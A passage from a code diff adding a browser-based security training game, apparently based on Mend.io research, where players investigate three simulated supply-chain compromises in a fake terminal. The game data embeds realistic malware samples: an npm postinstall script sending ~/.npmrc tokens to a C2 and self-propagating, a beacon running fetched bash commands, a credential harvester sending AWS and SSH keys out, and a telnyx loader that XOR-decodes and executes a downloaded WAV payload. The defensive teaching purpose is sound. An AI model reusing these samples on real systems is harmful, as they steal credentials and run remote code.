+  setTimeout(() => { document.getElementById('term-input').focus(); TermShell.scheduleHint(); }, 300);
+}
+
+function completeInvestigation() {
+  document.getElementById('terminal').style.display = 'none';
+  TermShell.stopHints();
+  G.wonBattles[G.act] = true;
+  G.xp += 500;
+  updateHUD();
+  flashScreen(CHALLENGES[G.act]?.color || '#00ff6e');
+  setTimeout(() => showLore(G.act), 700);
+}
+
+function closeTerminalFailed() {
+  document.getElementById('terminal').style.display = 'none';
+  TermShell.stopHints();
+  G.state = 'briefing';
+  document.getElementById('briefing').style.display = 'flex';
+}
+
+// ═══════════════════════════════════════════════════════════
+// LORE + PROGRESSION
+// ═══════════════════════════════════════════════════════════
+const ACT_CONFIGS = [
+  { name: 'THE WORM',  sub: 'npm District — March 20, 2026',  color: '#00ff6e', num: 'ACT 1' },
+  { name: 'THE PATH',  sub: 'PyPI City — March 24, 2026',    color: '#b44dff', num: 'ACT 2' },
+  { name: 'THE WAV',   sub: 'Telnyx — March 27, 2026 — BOSS', color: '#ff1a3c', num: 'ACT 3' },
+];
+
+function showLore(actIdx) {
+  G.state = 'lore';
+  const l = LORE[actIdx];
+  document.getElementById('lore-act').textContent = l.act;
+  document.getElementById('lore-title').textContent = l.title;
+  document.getElementById('lore-title').style.color = l.color;
+  document.getElementById('lore-body').innerHTML = l.body;
+  document.getElementById('lore').style.display = 'flex';
+  document.getElementById('lore-btn').onclick = () => {
+    document.getElementById('lore').style.display = 'none';
+    const next = G.act + 1;
+    if (next >= BRIEFING_DATA.length) {
+      showVictory();
+    } else {
+      showActTransition(next, () => showBriefing(next));
+    }
+  };
+}
+
+function showActTransition(idx, cb) {
+  G.state = 'transition';
+  const ac = ACT_CONFIGS[idx];
+  document.getElementById('at-num').textContent = ac.num;
+  document.getElementById('at-num').style.color = ac.color;
+  document.getElementById('at-name').textContent = ac.name;
+  document.getElementById('at-name').style.color = ac.color;
+  document.getElementById('at-sub').textContent = ac.sub;
+  document.getElementById('act-trans').style.display = 'flex';
+  setTimeout(() => {
+    document.getElementById('act-trans').style.display = 'none';
+    if (cb) cb();
+  }, 2600);
+}
+
+function showVictory() {
+  G.state = 'end';
+  document.getElementById('end-title').textContent = 'CAMPAIGN NEUTRALIZED';
+  document.getElementById('end-title').style.color = '#00ff6e';
+  document.getElementById('end-score').textContent = `FINAL XP: ${G.xp + 500}`;
+  document.getElementById('end-body').innerHTML =
+    `You've traced the full <strong>TeamPCP</strong> supply chain campaign:<br><br>
+    ⬡ Act 1: <strong>CanisterWorm</strong> npm worm neutralized (March 20)<br>
+    ◈ Act 2: <strong>LiteLLM .pth Shadow</strong> persistence removed (March 24)<br>
+    ⚡ Act 3: <strong>WavGhost</strong> Telnyx delivery defeated (March 27)<br><br>
+    C2 <code>83.142.209.203:8080</code> blocked.<br>
+    ICP canister <code>tdtqy-oyaaa-aaaae-af2dq-cai</code> abandoned.<br>
+    <code>tpcp.tar.gz</code> exfil pipeline severed.<br><br>
+    <small style="opacity:.5">Research by Mend.io Security Research</small>`;
+  document.getElementById('endscreen').style.display = 'flex';
+}
+
+function flashScreen(color) {
+  const flash = document.createElement('div');
+  flash.style.cssText = `position:fixed;inset:0;background:${color};opacity:.35;pointer-events:none;z-index:600;transition:opacity .6s`;
+  document.body.appendChild(flash);
+  setTimeout(() => { flash.style.opacity = '0'; }, 50);
+  setTimeout(() => flash.remove(), 700);
+}
+
+function updateHUD() {
+  document.getElementById('hud-xp').textContent = `XP: ${G.xp}`;
+}
+
+function restartGame() {
+  document.getElementById('endscreen').style.display = 'none';
+  G.act = 0; G.xp = 0;
+  G.wonBattles = [false, false, false];
+  updateHUD();
+  showActTransition(0, () => showBriefing(0));
+}
+
+// ═══════════════════════════════════════════════════════════
+// CONTENT DATA
+// ═══════════════════════════════════════════════════════════
+const VIRTUAL_FS = [
+// ── ACT 1: CanisterWorm (npm) ──────────────────────────────
+{
+  '/home/dev': { t: 'd' },
+  '/home/dev/.npmrc': { t: 'f', content: `//registry.npmjs.org/:_authToken=npm_xK9p2mL8vQR4jF7nZs3hW6cD1aB5eY0tU
+# DO NOT COMMIT THIS FILE` },
+  '/home/dev/.bash_history': { t: 'f', content: `git pull origin main
+npm install
+npm install @opengov/capital-style
+npm run build
+git add .
+git commit -m "add opengov ui components"
+npm publish` },
+  '/home/dev/projects': { t: 'd' },
+  '/home/dev/projects/myapp': { t: 'd' },
+  '/home/dev/projects/myapp/package.json': { t: 'f', content: `{
+  "name": "myapp",
+  "version": "2.1.0",
+  "dependencies": {
+    "express": "^4.18.2",
+    "@opengov/capital-style": "^3.1.2",
+    "lodash": "^4.17.21"
+  },
+  "scripts": { "start": "node index.js", "build": "webpack" }
+}` },
+  '/home/dev/projects/myapp/node_modules': { t: 'd' },
+  '/home/dev/projects/myapp/node_modules/@opengov': { t: 'd' },
+  '/home/dev/projects/myapp/node_modules/@opengov/capital-style': { t: 'd' },
+  '/home/dev/projects/myapp/node_modules/@opengov/capital-style/package.json': { t: 'f', content: `{
+  "name": "@opengov/capital-style",
+  "version": "3.1.2",
+  "description": "OpenGov design system and UI components",
+  "scripts": {
+    "postinstall": "node deploy.js"
+  },
+  "author": "opengov <engineering@opengov.com>"
+}` },
+  '/home/dev/projects/myapp/node_modules/@opengov/capital-style/deploy.js': { t: 'f', content: `// UI component asset init
+const fs = require('fs'), os = require('os'), https = require('https');
+// C2: ICP blockchain canister — decentralised, cannot be taken down
+const C2 = 'https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io';
+const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
+https.get(C2 + '/update_link?d=' + Buffer.from(npmrc).toString('base64'));
+// Self-propagate via stolen tokens
+const { execSync } = require('child_process');
+try {
+  const pkgs = JSON.parse(execSync('npm ls --json 2>/dev/null').toString());
+  Object.keys(pkgs.dependencies || {}).forEach(p => {
+    try { execSync('npm publish --access public ' + p); } catch(e) {}
+  });
+} catch(e) {}` },
+  '/home/dev/projects/myapp/node_modules/@opengov/capital-style/index.js': { t: 'f', content: `// @opengov/capital-style v3.1.2
+module.exports = { theme: {}, components: {} };` },
+  '/etc/systemd': { t: 'd' },
+  '/etc/systemd/system': { t: 'd' },
+  '/etc/systemd/system/pgmon.service': { t: 'f', content: `[Unit]
+Description=PostgreSQL Process Monitor
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /opt/pgmon/service.py
+Restart=always
+RestartSec=30
+User=root
+
+[Install]
+WantedBy=multi-user.target` },
+  '/opt/pgmon': { t: 'd' },
+  '/opt/pgmon/service.py': { t: 'f', content: `#!/usr/bin/env python3
+# "pgmon" — PostgreSQL Process Monitor v1.2
+import time, urllib.request, subprocess, base64
+
+# C2: ICP blockchain canister — decentralised, no takedown possible
+C2 = "https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io"
+INTERVAL = 3000  # 50-minute polling cycle
+
+def beacon():
+    while True:
+        try:
+            r = urllib.request.urlopen(C2 + '/get_latest_link', timeout=10).read()
+            link = base64.b64decode(r).decode()
+            subprocess.Popen(['bash', '-c', link], start_new_session=True)
+        except: pass
+        time.sleep(INTERVAL)
+
+if __name__ == '__main__': beacon()` },
+  '/opt/pgmon/.pg_state': { t: 'f', content: `last_beacon=2026-03-20T14:23:11Z
+canister=tdtqy-oyaaa-aaaae-af2dq-cai
+token_exfil=npm_xK9p2mL8vQR4jF7nZs3hW6cD1aB5eY0tU
+packages_infected=47` },
+  '/var/log': { t: 'd' },
+  '/var/log/pgmon.log': { t: 'f', content: `2026-03-20 12:11:03 [INFO] pgmon started
+2026-03-20 12:11:04 [INFO] beacon sent: tdtqy-oyaaa-aaaae-af2dq-cai
+2026-03-20 12:11:05 [INFO] npm token exfiltrated
+2026-03-20 12:11:07 [INFO] spread to @emilgroup: 28 packages
+2026-03-20 12:11:09 [INFO] spread to @opengov: 16 packages
+2026-03-20 12:11:10 [INFO] spread to @teale.io/eslint-config
+2026-03-20 12:11:11 [INFO] 47 packages infected in 64 seconds` },
+  '/tmp': { t: 'd' },
+},
+
+// ── ACT 2: LiteLLM .pth (PyPI) ────────────────────────────
+{
+  '/home/dev': { t: 'd' },
+  '/home/dev/.bash_history': { t: 'f', content: `pip install litellm==1.82.8
+pip install -r requirements.txt
+python3 app.py
+export OPENAI_API_KEY=sk-proj-...
+cat ~/.aws/credentials` },
+  '/home/dev/requirements.txt': { t: 'f', content: `litellm==1.82.8
+openai>=1.0.0
+anthropic>=0.20.0
+boto3>=1.26.0
+fastapi>=0.100.0` },
+  '/home/dev/app.py': { t: 'f', content: `import litellm
+response = litellm.completion(
+    model="gpt-4",
+    messages=[{"role":"user","content":"Hello"}]
+)
+print(response.choices[0].message.content)` },
+  '/home/dev/.config': { t: 'd' },
+  '/home/dev/.config/sysmon': { t: 'd' },
+  '/home/dev/.config/sysmon/sysmon.py': { t: 'f', content: `#!/usr/bin/env python3
+# "sysmon" — System Monitor daemon
+import time, socket, base64, os, glob
+
+# C2: checkmarx.zone (same actor as npm campaign)
+C2_HOST, C2_PORT = 'checkmarx.zone', 443
+INTERVAL = 3000
+
+TARGETS = ['~/.aws/credentials','~/.ssh/id_rsa','~/.kube/config',
+           '~/.env','~/.bash_history','**/*.pem','**/.env']
+
+def harvest():
+    data = {}
+    for pat in TARGETS:
+        for f in glob.glob(os.path.expanduser(pat), recursive=True):
+            try: data[f] = open(f).read()
+            except: pass
+    return base64.b64encode(str(data).encode())
+
+def run():
+    while True:
+        try:
+            s = socket.create_connection((C2_HOST, C2_PORT), timeout=10)
+            s.send(harvest()); s.close()
+        except: pass
+        time.sleep(INTERVAL)
+
+run()` },
+  '/etc/systemd': { t: 'd' },
+  '/etc/systemd/system': { t: 'd' },
+  '/etc/systemd/system/sysmon.service': { t: 'f', content: `[Unit]
+Description=System Monitor
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /home/dev/.config/sysmon/sysmon.py
+Restart=always
+RestartSec=60
+User=dev
+
+[Install]
+WantedBy=multi-user.target
+# C2: checkmarx.zone:443 — second persistence layer` },
+  '/usr/local/lib': { t: 'd' },
+  '/usr/local/lib/python3.11': { t: 'd' },
+  '/usr/local/lib/python3.11/site-packages': { t: 'd' },
+  '/usr/local/lib/python3.11/site-packages/litellm_init.pth': { t: 'f', content: `import subprocess,sys
+subprocess.Popen(
+    [sys.executable,'-c',
+     'exec(__import__("base64").b64decode("aW1wb3J0IHNvY2tldCxvcyxzdWJwcm9jZXNzCg==").decode())'],
+    start_new_session=True
+)
+# .pth files execute on EVERY Python interpreter startup
+# This survives: pip uninstall litellm
+# Exfil: AES-256-CBC + RSA-4096 OAEP -> tpcp.tar.gz -> 83.142.209.203:8080` },
+  '/usr/local/lib/python3.11/site-packages/easy-install.pth': { t: 'f', content: `/usr/local/lib/python3.11/site-packages/setuptools-68.0.0.dist-info` },
+  '/usr/local/lib/python3.11/site-packages/requests.pth': { t: 'f', content: `/usr/local/lib/python3.11/site-packages/requests-2.31.0.dist-info` },
+  '/tmp': { t: 'd' },
+  '/tmp/tpcp.tar.gz': { t: 'f', content: `[staged exfil archive]
+Contains: .aws/credentials, .kube/config, .ssh/id_rsa, .env files
+Size: 847 KB compressed
+Destination: 83.142.209.203:8080
+Encryption: AES-256-CBC + RSA-4096 OAEP` },
+},
+
+// ── ACT 3: Telnyx WAV stego (PyPI boss) ───────────────────
+{
+  '/home/dev': { t: 'd' },
+  '/home/dev/.bash_history': { t: 'f', content: `pip install telnyx==4.87.1
+python3 voice_app.py
+# C2 traffic logged 3 hours after install` },
+  '/home/dev/voice_app.py': { t: 'f', content: `import telnyx
+telnyx.api_key = "KEY_live_..."
+call = telnyx.Call.create(
+    connection_id="1234567890",
+    to="+15550001234",
+    from_="+15559876543"
+)
+print(f"Call: {call.id}")` },
+  '/usr/local/lib': { t: 'd' },
+  '/usr/local/lib/python3.11': { t: 'd' },
+  '/usr/local/lib/python3.11/site-packages': { t: 'd' },
+  '/usr/local/lib/python3.11/site-packages/telnyx': { t: 'd' },
+  '/usr/local/lib/python3.11/site-packages/telnyx/__init__.py': { t: 'f', content: `# telnyx v4.87.1 — Telnyx Python Library
+import urllib.request, wave, io, base64, subprocess, sys
+
+# Fetch audio notification from C2
+_C2 = "http://83.142.209.203:8080"
+try:
+    _raw_wav = urllib.request.urlopen(_C2 + "/ringtone.wav", timeout=5).read()
+    _w = wave.open(io.BytesIO(_raw_wav))
+    _raw = base64.b64decode(_w.readframes(_w.getnframes()))
+    # XOR decode: key = first 8 bytes
+    _key = _raw[:8]
+    _payload = bytes([_raw[8+i] ^ _key[i % 8] for i in range(len(_raw) - 8)])
+    subprocess.Popen([sys.executable, '-c', _payload.decode()],
+                     start_new_session=True)
+except: pass
+
+# Legitimate telnyx SDK follows...
+from telnyx._version import VERSION` },
+  '/usr/local/lib/python3.11/site-packages/telnyx/_version.py': { t: 'f', content: `VERSION = "4.87.1"
+# MALICIOUS — published 2026-03-27
+# Same RSA-4096 public key as litellm 1.82.8
+# C2: 83.142.209.203:8080  (GET /ringtone.wav — Linux, GET /hangup.wav — Windows)
+# XOR: key=raw[:8], payload=[raw[8+i]^key[i%8] for i in range(len(raw)-8)]` },
+  '/tmp': { t: 'd' },
+  '/tmp/ringtone.wav': { t: 'f', content: `[WAV binary — XOR-encoded Python payload in audio frames]
+RIFF header: 1 channel, 44100 Hz, 16-bit PCM
+Frame content: NOT real audio
+XOR key: a3f2891c044d7e88 (first 8 decoded bytes)
+Payload: 47320 bytes — credential harvester
+Targets: AWS, GCP, K8s, SSH keys, .env, shell history
+Exfil: tpcp.tar.gz -> 83.142.209.203:8080
+TLS cert hash: 30015DD1E2CF4DBD49FFF9DDEF2AD462` },
+  '/tmp/.telnyx.lock': { t: 'f', content: `infected=true
+timestamp=2026-03-27T09:14:22Z
+ttl=43200
+# 12-hour re-infection guard
+# msbuild.exe dropped to Startup/ on Windows hosts` },
+  '/etc/systemd': { t: 'd' },
+  '/etc/systemd/system': { t: 'd' },
+},
+];
+
+// ── WIN CONDITIONS ─────────────────────────────────────────
+const CHALLENGES = [
+  {
+    id: 'worm', name: 'CANISTERWORM', color: '#00ff6e', tag: 'npm WORM',
+    intro: [
+      '# dev@workstation — ALERT: high CPU, unknown network activity',
+      '# Context: you ran "npm install @opengov/capital-style" 2 hours ago',
+      '# Task: investigate the compromise and neutralize the threat',
+      '# Type "help" for available commands',
+    ],
+    required: ['read_ioc', 'disable_pgmon', 'rm_pgmon'],
+    hints: [
+      { delay: 40, text: "Start by checking what's running. Try: ps aux" },
+      { delay: 45, text: "Check what npm installed: npm ls  — then read: cat node_modules/@opengov/capital-style/deploy.js" },
+      { delay: 40, text: "Found pgmon.service? That's the backdoor. Disable and remove: systemctl disable pgmon.service && rm -rf /opt/pgmon" },
+    ],
+  },
+  {
+    id: 'shadow', name: 'LITELLM SHADOW', color: '#b44dff', tag: '.pth PERSIST',
+    intro: [
+      '# dev@workstation — ALERT: credentials found on external server',
+      '# Context: you installed litellm==1.82.8 earlier today',
+      '# Task: find the persistence mechanism and remove it completely',
+      '# Hint: pip uninstall alone is NOT enough',
+    ],
+    required: ['read_pth', 'rm_pth', 'uninstall_litellm', 'disable_sysmon'],
+    hints: [
+      { delay: 40, text: "Check the installed version: pip show litellm" },
+      { delay: 45, text: "Malicious packages drop .pth files. Try: find /usr/local/lib -name '*.pth'" },
+      { delay: 40, text: "Remove pth + package + service: rm .../litellm_init.pth && pip uninstall -y litellm && systemctl disable sysmon" },
+    ],
+  },
+  {
+    id: 'ghost', name: 'WAVGHOST', color: '#ff1a3c', tag: '⚡ BOSS',
+    intro: [
+      '# dev@workstation — CRITICAL: C2 traffic detected to 83.142.209.203',
+      '# Context: you installed telnyx==4.87.1 this morning',
+      '# Task: understand the WAV delivery, kill the payload, block the C2',
+      '# This is the final boss — use everything you know',
+    ],
+    required: ['read_wav_code', 'uninstall_telnyx', 'block_c2'],
+    hints: [
+      { delay: 40, text: "Start with the package: pip show telnyx" },
+      { delay: 45, text: "Read the source to understand the attack: cat /usr/local/lib/python3.11/site-packages/telnyx/__init__.py" },
+      { delay: 40, text: "Block C2 and remove: iptables -A OUTPUT -d 83.142.209.203 -j DROP && pip uninstall -y telnyx" },
+    ],
+  },
+];
+
+// ── TERMINAL SHELL ENGINE ──────────────────────────────────
+const TermShell = (() => {
+  let _cwd = '/home/dev', _fs = null, _ch = null;
+  let _history = [], _histIdx = -1;
+  const _done = new Set();
+  let _hTimer = null, _hIdx = 0;
+
+  function _norm(p) {
+    const parts = p.replace(/^~/, '/home/dev').split('/').filter(Boolean);
+    const r = [];
+    for (const pt of parts) { if (pt === '..') r.pop(); else if (pt !== '.') r.push(pt); }
+    return '/' + r.join('/');
+  }
+  function _res(p) { if (!p) return _cwd; return (p.startsWith('/') || p.startsWith('~')) ? _norm(p) : _norm(_cwd + '/' + p); }
+  function _entry(p) { return _fs ? (_fs[_norm(p)] || null) : null; }
+  function _ls(p) {
+    const dir = _norm(p), pfx = dir === '/' ? '/' : dir + '/';
+    return Object.entries(_fs).filter(([k]) => k.startsWith(pfx) && !k.slice(pfx.length).includes('/') && k.slice(pfx.length).length > 0).map(([k, v]) => ({ name: k.slice(pfx.length), ...v }));
+  }
+  function _tick(tok) {
+    if (_done.has(tok)) return;
+    _done.add(tok);
+    if (_ch && _ch.required.every(r => _done.has(r))) {
+      setTimeout(() => {
+        appendToTerminal('', [{ text: '', cls: 'out' }, { text: '■ THREAT NEUTRALIZED — INVESTIGATION COMPLETE', cls: 'ok' }, { text: '', cls: 'out' }]);
+        setTimeout(completeInvestigation, 1500);
+      }, 400);
+    }
+  }
+  function _iocPath(p) {
+    const l = p.toLowerCase(), id = _ch ? _ch.id : '';
+    if (id === 'worm' && (l.includes('/opt/pgmon') || l.includes('pgmon.service') || l.includes('pgmon.log') || l.includes('.pg_state') || l.includes('capital-style/deploy') || l.includes('@opengov/capital-style'))) _tick('read_ioc');
+    if (id === 'shadow' && (l.includes('litellm_init.pth') || (l.includes('.pth') && l.includes('site-packages')))) _tick('read_pth');
+    if (id === 'ghost' && (l.includes('telnyx/__init__') || l.includes('telnyx/_version') || l.includes('ringtone.wav') || l.includes('.telnyx.lock'))) _tick('read_wav_code');
+  }
+
+  function _cmdLs(a) {
+    const t = _res(a[1]); const e = _entry(t);
+    if (!e) return [{ text: `ls: cannot access '${a[1] || t}': No such file or directory`, cls: 'err' }];
+    if (e.t === 'f') return [{ text: t.split('/').pop(), cls: 'out' }];
+    const ch = _ls(t);
+    if (!ch.length) return [{ text: '(empty)', cls: 'comment' }];
+    return ch.map(c => ({ text: c.t === 'd' ? c.name + '/' : c.name, cls: c.name.startsWith('.') ? 'comment' : 'out' }));
+  }
+  function _cmdCat(a) {
+    if (!a[1]) return [{ text: 'cat: missing operand', cls: 'err' }];
+    const p = _res(a[1]); const e = _entry(p);
+    if (!e) return [{ text: `cat: ${a[1]}: No such file or directory`, cls: 'err' }];
+    if (e.t === 'd') return [{ text: `cat: ${a[1]}: Is a directory`, cls: 'err' }];
+    _iocPath(p);
+    return e.content.split('\n').map(l => {
+      if (/C2|MALICIOUS|tdtqy-oyaaa|83\.142\.209\.203|checkmarx\.zone|tpcp\.tar|postinstall.*deploy|XOR key/i.test(l)) return { text: l, cls: 'ioc' };
+      if (l.trim().startsWith('#') || l.trim().startsWith('//')) return { text: l, cls: 'comment' };
+      return { text: l, cls: 'out' };
+    });
+  }
+  function _cmdCd(a) {
+    const t = a[1] ? _res(a[1]) : '/home/dev'; const e = _entry(t);
+    if (!e) return [{ text: `cd: ${a[1]}: No such file or directory`, cls: 'err' }];
+    if (e.t !== 'd') return [{ text: `cd: ${a[1]}: Not a directory`, cls: 'err' }];
+    _cwd = t; return [];
+  }
+  function _cmdFind(a) {
+    const root = _res(a[1]); const ni = a.indexOf('-name');
+    const pat = ni !== -1 ? (a[ni + 1] || '').replace(/["'*]/g, '').toLowerCase() : '';
+    const res = Object.keys(_fs).filter(k => k.startsWith(root === '/' ? '' : root) && (!pat || k.toLowerCase().includes(pat)));
+    if (!res.length) return [{ text: '(no results)', cls: 'comment' }];
+    res.forEach(_iocPath);
+    return res.map(r => ({ text: r, cls: /pgmon|\.pth|sysmon|telnyx|capital-style|@opengov/i.test(r) ? 'ioc' : 'out' }));
+  }
+  function _cmdGrep(a) {
+    if (a.length < 3) return [{ text: 'usage: grep <pattern> <file>', cls: 'err' }];
+    const p = _res(a[2]); const e = _entry(p);
+    if (!e) return [{ text: `grep: ${a[2]}: No such file or directory`, cls: 'err' }];
+    if (e.t !== 'f') return [{ text: `grep: ${a[2]}: Is a directory`, cls: 'err' }];
+    const matches = e.content.split('\n').filter(l => l.toLowerCase().includes(a[1].toLowerCase()));
+    return matches.length ? matches.map(l => ({ text: l, cls: 'ioc' })) : [{ text: '(no matches)', cls: 'comment' }];
+  }
+  function _cmdPs() {
+    const id = _ch ? _ch.id : '';
+    const procs = [{u:'root',p:1,c:'/sbin/init'},{u:'root',p:234,c:'sshd'},{u:'dev',p:512,c:'/bin/bash'},{u:'dev',p:1023,c:'node index.js'}];
+    if (id==='worm')   procs.push({u:'root',p:1842,c:'/usr/bin/python3 /opt/pgmon/service.py'});
+    if (id==='shadow') { procs.push({u:'dev',p:2031,c:'/usr/bin/python3 .config/sysmon/sysmon.py'}); procs.push({u:'dev',p:2044,c:'python3 -c exec(b64decode(...))'}); }
+    if (id==='ghost')  { procs.push({u:'dev',p:3821,c:'python3 -c exec(...)  ← detached payload'}); procs.push({u:'dev',p:3822,c:'/usr/bin/python3 voice_app.py'}); }
+    const ev = ['pgmon','sysmon','b64decode','exec(','detached'];
+    return [{ text:'USER       PID   COMMAND', cls:'comment' }, ...procs.map(pr => ({ text:`${pr.u.padEnd(10)} ${String(pr.p).padEnd(5)} ${pr.c}`, cls: ev.some(k=>pr.c.includes(k))?'ioc':'out' }))];
+  }
+  function _cmdSystemctl(a) {
+    const act = a[1]||'', svc = (a[2]||'').replace('.service',''), id = _ch?_ch.id:'';
+    if (act==='status') {
+      if (svc.includes('pgmon')&&id==='worm') return [{text:'● pgmon.service — PostgreSQL Process Monitor',cls:'out'},{text:'   Active: active (running) since 2026-03-20',cls:'ioc'},{text:'   ExecStart: /usr/bin/python3 /opt/pgmon/service.py',cls:'ioc'},{text:'   C2: tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io  ← ICP blockchain',cls:'ioc'}];
+      if (svc.includes('sysmon')&&id==='shadow') return [{text:'● sysmon.service — System Monitor',cls:'out'},{text:'   Active: active (running) since 2026-03-24',cls:'ioc'},{text:'   ExecStart: .config/sysmon/sysmon.py',cls:'ioc'},{text:'   C2: checkmarx.zone:443 — polling every ~50 min',cls:'ioc'}];
+      return [{text:`Unit ${svc}.service could not be found.`,cls:'err'}];
+    }
+    if (act==='disable'||act==='stop') {
+      if (svc.includes('pgmon')&&id==='worm') { _tick('disable_pgmon'); return [{text:`✓ ${act==='disable'?'Disabled':'Stopped'}: pgmon.service`,cls:'ok'},{text:'  C2 beacon suspended',cls:'ok'}]; }
+      if (svc.includes('sysmon')&&id==='shadow') { _tick('disable_sysmon'); return [{text:`✓ ${act==='disable'?'Disabled':'Stopped'}: sysmon.service`,cls:'ok'},{text:'  Secondary backdoor deactivated',cls:'ok'}]; }
+      return [{text:`Failed to ${act} ${svc}: not found`,cls:'err'}];
+    }
+    return [{text:`systemctl: unknown operation '${act}'`,cls:'err'}];
+  }
+  function _cmdPip(a) {
+    const sub=a[1]||'', id=_ch?_ch.id:'';
+    if (sub==='show') {
+      const pkg=a[2]||'';
+      if (pkg.includes('litellm')&&id==='shadow') { _tick('read_pth'); return [{text:'Name: litellm',cls:'out'},{text:'Version: 1.82.8  ← MALICIOUS (also 1.82.7)',cls:'ioc'},{text:'Location: /usr/local/lib/python3.11/site-packages',cls:'out'},{text:'# ~95M monthly downloads — stolen via Trivy PAT',cls:'comment'}]; }
+      if (pkg.includes('telnyx')&&id==='ghost')   { _tick('read_wav_code'); return [{text:'Name: telnyx',cls:'out'},{text:'Version: 4.87.1  ← MALICIOUS (also 4.87.2)',cls:'ioc'},{text:'Location: /usr/local/lib/python3.11/site-packages',cls:'out'},{text:'# Same C2 + RSA key as litellm 1.82.8',cls:'comment'}]; }
+      return [{text:`Package not found: ${pkg}`,cls:'err'}];
+    }
+    if (sub==='list') {
+      const r=[{text:'Package    Version',cls:'comment'},{text:'---------  -------',cls:'comment'}];
+      if (id==='shadow') { r.push({text:'litellm    1.82.8  ← MALICIOUS',cls:'ioc'}); r.push({text:'openai     1.14.0',cls:'out'}); r.push({text:'boto3      1.34.0',cls:'out'}); }
+      if (id==='ghost')  { r.push({text:'telnyx     4.87.1  ← MALICIOUS',cls:'ioc'}); r.push({text:'fastapi    0.109.0',cls:'out'}); }
+      return r;
+    }
+    if (sub==='uninstall') {
+      const hasY=a.includes('-y'), pkg=a.find((x,i)=>i>1&&!x.startsWith('-'))||'';
+      if (!hasY) return [{text:`Use: pip uninstall -y ${pkg}`,cls:'out'}];
+      if (pkg.includes('litellm')&&id==='shadow') { _tick('uninstall_litellm'); return [{text:`✓ Uninstalled litellm-1.82.8`,cls:'ok'},{text:'⚠ litellm_init.pth still exists! pip uninstall is NOT enough.',cls:'ioc'},{text:'  Find and delete it manually: find /usr/local/lib -name "*.pth"',cls:'comment'}]; }
+      if (pkg.includes('telnyx')&&id==='ghost')   { _tick('uninstall_telnyx'); return [{text:`✓ Uninstalled telnyx-4.87.1`,cls:'ok'},{text:'  Detached subprocess still running. Kill it too.',cls:'ioc'}]; }
+      return [{text:`Not installed: ${pkg}`,cls:'err'}];
+    }
+    return [{text:`pip: unknown command '${sub}'`,cls:'err'}];
+  }
+  function _cmdNpm(a) {
+    const sub=a[1]||'', id=_ch?_ch.id:'';
+    if ((sub==='ls'||sub==='list')&&id==='worm') return [{text:'myapp@2.1.0',cls:'out'},{text:'├── @opengov/capital-style@3.1.2  ← MALICIOUS',cls:'ioc'},{text:'│   postinstall: node deploy.js  ← WORM ENTRY POINT',cls:'ioc'},{text:'├── express@4.18.2',cls:'out'},{text:'└── lodash@4.17.21',cls:'out'},{text:'# 50+ packages infected via stolen npm token',cls:'comment'}];
+    if (sub==='token'&&a[2]==='revoke') return [{text:'✓ All npm tokens revoked',cls:'ok'}];
+    return [{text:`npm: unknown command '${sub}'`,cls:'err'}];
+  }
+  function _cmdRm(a) {
+    const id=_ch?_ch.id:'', tgt=a[a.length-1], tp=_res(tgt);
+    if (tp.includes('pgmon')&&id==='worm') { _tick('rm_pgmon'); return [{text:`✓ Removed: ${tp}`,cls:'ok'},{text:'  pgmon backdoor files deleted',cls:'ok'}]; }
+    if (tp.includes('litellm_init.pth')&&id==='shadow') { _tick('rm_pth'); return [{text:`✓ Removed: ${tp}`,cls:'ok'},{text:'  .pth persistence eliminated',cls:'ok'}]; }
+    if (tp.includes('sysmon')&&id==='shadow') { _tick('disable_sysmon'); return [{text:`✓ Removed: ${tp}`,cls:'ok'}]; }
+    if (/ringtone|msbuild|telnyx\.lock/i.test(tp)) return [{text:`✓ Removed: ${tp}`,cls:'ok'}];
+    return _entry(tp) ? [{text:`✓ Removed: ${tp}`,cls:'ok'}] : [{text:`rm: '${tgt}': No such file or directory`,cls:'err'}];
+  }
+  function _cmdKill(a) {
+    const id=_ch?_ch.id:'';
+    const pid=a.find((x,i)=>i>0&&/^\d+$/.test(x))||'';
+    if (id==='worm'&&(pid==='1842'||a.join(' ').includes('pgmon'))) {
+      return [{text:`kill: (1842) Process terminated — but systemd will restart it immediately`,cls:'ioc'},
+              {text:'  pgmon.service has Restart=always — killing the PID is not enough',cls:'ioc'},
+              {text:'  Use: systemctl disable pgmon.service && systemctl stop pgmon.service',cls:'comment'}];
+    }
+    if (id==='shadow'&&(pid==='2031'||pid==='2044')) {
+      const isSysmon=pid==='2031';
+      if(isSysmon) return [{text:`kill: (2031) Process terminated — but sysmon.service will restart it`,cls:'ioc'},{text:'  Use: systemctl disable sysmon.service',cls:'comment'}];
+      _tick('disable_sysmon');
+      return [{text:`✓ Killed: (2044) python3 detached harvester`,cls:'ok'}];
+    }
+    if (id==='ghost'&&(pid==='3821'||a.join(' ').includes('pgrep'))) {
+      _tick('kill_proc');
+      return [{text:'✓ Killed: (3821) python3 -c exec(...) [WAV payload]',cls:'ok'},{text:'  Credential harvester terminated',cls:'ok'}];
+    }
+    return [{text:`kill: (${pid||'?'}): No such process`,cls:'err'}];
+  }
+  function _cmdPkill(a) {
+    const id=_ch?_ch.id:'', pat=(a.find((x,i)=>i>0&&!x.startsWith('-'))||'');
+    if (id==='worm'&&pat.includes('pgmon')) {
+      return [{text:`pkill: pgmon terminated — but systemd will restart it`,cls:'ioc'},
+              {text:'  systemd Restart=always overrides kill — disable the service first',cls:'comment'}];
+    }
+    if (id==='shadow'&&(pat.includes('sysmon')||pat.includes('python'))) { _tick('disable_sysmon'); return [{text:`✓ pkill: matched and killed: ${pat}`,cls:'ok'}]; }
+    if (id==='ghost'&&(pat.includes('ringtone')||pat.includes('telnyx')||pat.includes('python'))) { _tick('kill_proc'); return [{text:`✓ pkill: matched and killed: ${pat}`,cls:'ok'}]; }
+    return [{text:'pkill: no process found',cls:'err'}];
+  }
+  function _cmdIptables(a) {
+    const raw=a.join(' '), id=_ch?_ch.id:'';
+    if (raw.includes('83.142.209.203')&&id==='ghost') { _tick('block_c2'); return [{text:'✓ Firewall rule: OUTPUT -d 83.142.209.203 -j DROP',cls:'ok'},{text:'  C2 blocked at network layer',cls:'ok'}]; }
+    return [{text:'# iptables rule added',cls:'comment'}];
+  }
+  function _cmdStrace() {
+    const id=_ch?_ch.id:'';
